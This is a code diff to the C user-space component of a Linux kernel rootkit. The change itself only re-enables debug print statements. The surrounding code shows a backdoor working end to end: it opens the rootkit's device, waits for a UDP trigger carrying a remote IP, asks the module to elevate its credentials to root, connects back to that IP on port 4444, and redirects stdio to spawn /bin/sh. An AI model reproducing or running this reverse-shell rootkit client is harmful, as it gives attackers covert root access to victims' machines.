@@ -11,7 +11,7 @@
 #include "interface.h"
 
 int main(void) {
-    // printf("[revshell] Started. Attempting to open /dev/%s...\n", rootkit_DEV_NAME);
+    printf("[revshell] Started. Attempting to open /dev/%s...\n", rootkit_DEV_NAME);
     fflush(stdout);
 
     int dev_fd = open("/dev/" rootkit_DEV_NAME, O_RDWR);
@@ -20,8 +20,8 @@ int main(void) {
         return 1;
     }
 
-    // printf("[revshell] Device /dev/%s opened successfully (fd=%d).\n", rootkit_DEV_NAME, dev_fd);
-    // printf("[revshell] Waiting in kernel space for UDP trigger (rootkit_IOCTL_WAIT_REMOTE)...\n");
+    printf("[revshell] Device /dev/%s opened successfully (fd=%d).\n", rootkit_DEV_NAME, dev_fd);
+    printf("[revshell] Waiting in kernel space for UDP trigger (rootkit_IOCTL_WAIT_REMOTE)...\n");
     fflush(stdout);
 
     struct in_addr remote_ip;
@@ -39,8 +39,8 @@ int main(void) {
         strncpy(ip_str, "0.0.0.0", sizeof(ip_str));
     }
 
-    // printf("[revshell] TRIGGER RECEIVED! Remote IP: %s\n", ip_str);
-    // printf("[revshell] Requesting root privilege elevation (rootkit_IOCTL_ELEVATE)...\n");
+    printf("[revshell] TRIGGER RECEIVED! Remote IP: %s\n", ip_str);
+    printf("[revshell] Requesting root privilege elevation (rootkit_IOCTL_ELEVATE)...\n");
     fflush(stdout);
 
     /* Elevate credentials to root (UID 0, GID 0) */
@@ -50,8 +50,8 @@ int main(void) {
         return 1;
     }
 
-    // printf("[revshell] Credentials elevated successfully (UID=%d, EUID=%d).\n", getuid(), geteuid());
-    // printf("[revshell] Creating TCP socket...\n");
+    printf("[revshell] Credentials elevated successfully (UID=%d, EUID=%d).\n", getuid(), geteuid());
+    printf("[revshell] Creating TCP socket...\n");
     fflush(stdout);
 
     close(dev_fd);
@@ -69,7 +69,7 @@ int main(void) {
     sa.sin_port = htons(4444);
     sa.sin_addr = remote_ip;
 
-    // printf("[revshell] Connecting to %s:4444...\n", ip_str);
+    printf("[revshell] Connecting to %s:4444...\n", ip_str);
     fflush(stdout);
 
     if (connect(sock, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
@@ -78,7 +78,7 @@ int main(void) {
         return 1;
     }
 
-    // printf("[revshell] Connected to %s:4444! Redirecting stdio and spawning /bin/sh...\n", ip_str);
+    printf("[revshell] Connected to %s:4444! Redirecting stdio and spawning /bin/sh...\n", ip_str);
     fflush(stdout);
 
     /* Redirect stdin, stdout, stderr to networootkit socket */
